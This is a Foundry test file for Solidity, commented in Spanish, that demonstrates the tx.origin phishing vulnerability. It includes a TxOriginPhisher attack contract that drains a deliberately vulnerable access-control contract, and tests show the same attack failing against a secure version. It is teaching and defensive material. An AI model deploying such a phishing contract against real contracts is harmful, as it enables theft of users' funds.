// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/vulnerable/VulnerableAccessControl.sol";
import "../contracts/secure/SecureAccessControl.sol";

/// @title TxOriginPhisher - Contrato que explota tx.origin
/// @notice Simula un contrato malicioso que engana al owner para
///         drenar VulnerableAccessControl.
contract TxOriginPhisher {
    VulnerableAccessControl public target;
    address public thief;

    constructor(address _target, address _thief) {
        target = VulnerableAccessControl(payable(_target));
        thief = _thief;
    }

    /// @notice Funcion aparentemente inocua que el owner podria llamar.
    ///         Internamente drena el contrato victima.
    /// @dev Cuando el owner llama a esta funcion:
    ///      - msg.sender en esta funcion = owner (EOA)
    ///      - msg.sender en target.withdraw() = address(this) (phisher)
    ///      - tx.origin en target.withdraw() = owner (EOA) <-- pasa el check!
    function claimReward() external {
        // El owner cree que esta reclamando un reward,
        // pero en realidad esta autorizando un withdraw al thief
        target.withdraw(payable(thief));
    }
}

/// @title SecurePhishAttempt - Intenta el mismo ataque contra SecureAccessControl
contract SecurePhishAttempt {
    SecureAccessControl public target;
    address public thief;

    constructor(address _target, address _thief) {
        target = SecureAccessControl(payable(_target));
        thief = _thief;
    }

    function claimReward() external {
        target.withdraw(payable(thief));
    }
}

/// @title AccessControlAttackTest
/// @notice Tests que demuestran:
///         1. Ataque de phishing via tx.origin contra VulnerableAccessControl
///         2. El mismo ataque fallando contra SecureAccessControl
contract AccessControlAttackTest is Test {
    VulnerableAccessControl public vulnerableContract;
    SecureAccessControl public secureContract;

    address public owner;
    address public thief;

    uint256 constant CONTRACT_BALANCE = 5 ether;

    function setUp() public {
        owner = makeAddr("owner");
        thief = makeAddr("thief");

        // Deploy contratos como owner
        vm.startPrank(owner);
        vulnerableContract = new VulnerableAccessControl();
        secureContract = new SecureAccessControl();
        vm.stopPrank();

        // Fondear los contratos
        vm.deal(address(vulnerableContract), CONTRACT_BALANCE);
        vm.deal(address(secureContract), CONTRACT_BALANCE);
    }

    // =========================================================================
    // Tests contra VulnerableAccessControl
    // =========================================================================

    function test_VulnerableAC_OwnerCanWithdraw() public {
        // El owner legitimo puede retirar normalmente
        vm.prank(owner);
        vulnerableContract.withdraw(payable(owner));
        assertEq(owner.balance, CONTRACT_BALANCE);
    }

    function test_VulnerableAC_NonOwnerCannotWithdrawDirectly() public {
        // Un non-owner NO puede llamar withdraw directamente
        vm.prank(thief);
        vm.expectRevert("Not owner");
        vulnerableContract.withdraw(payable(thief));
    }

    function test_VulnerableAC_PhishingAttackSucceeds() public {
        // El thief deploya un contrato de phishing
        vm.prank(thief);
        TxOriginPhisher phisher = new TxOriginPhisher(
            address(vulnerableContract),
            thief
        );

        uint256 thiefBalanceBefore = thief.balance;

        // El owner es enganado para llamar claimReward() del phisher
        // tx.origin = owner, asi que pasa el check en VulnerableAccessControl
        vm.prank(owner);
        phisher.claimReward();

        // El thief recibe todos los fondos
        assertEq(
            thief.balance,
            thiefBalanceBefore + CONTRACT_BALANCE,
            "Thief should receive all funds via phishing"
        );
        assertEq(
            address(vulnerableContract).balance,
            0,
            "Vulnerable contract should be drained"
        );
    }

    // =========================================================================
    // Tests contra SecureAccessControl
    // =========================================================================

    function test_SecureAC_OwnerCanWithdraw() public {
        vm.prank(owner);
        secureContract.withdraw(payable(owner));
        assertEq(owner.balance, CONTRACT_BALANCE);
    }

    function test_SecureAC_PhishingAttackFails() public {
        // El thief deploya un contrato de phishing contra SecureAccessControl
        vm.prank(thief);
        SecurePhishAttempt phisher = new SecurePhishAttempt(
            address(secureContract),
            thief
        );

        // El owner llama claimReward(), pero esta vez falla
        // porque msg.sender = address(phisher), no owner
        vm.prank(owner);
        vm.expectRevert("Not owner");
        phisher.claimReward();

        // Los fondos siguen seguros
        assertEq(
            address(secureContract).balance,
            CONTRACT_BALANCE,
            "Secure contract should still have all funds"
        );
    }

    function test_SecureAC_TransferOwnership() public {
        address newOwner = makeAddr("newOwner");

        vm.prank(owner);
        secureContract.transferOwnership(newOwner);

        assertEq(secureContract.owner(), newOwner);

        // El nuevo owner puede retirar
        vm.prank(newOwner);
        secureContract.withdraw(payable(newOwner));
        assertEq(newOwner.balance, CONTRACT_BALANCE);
    }

    function test_SecureAC_NonOwnerCannotTransferOwnership() public {
        vm.prank(thief);
        vm.expectRevert("Not owner");
        secureContract.transferOwnership(thief);
    }
}
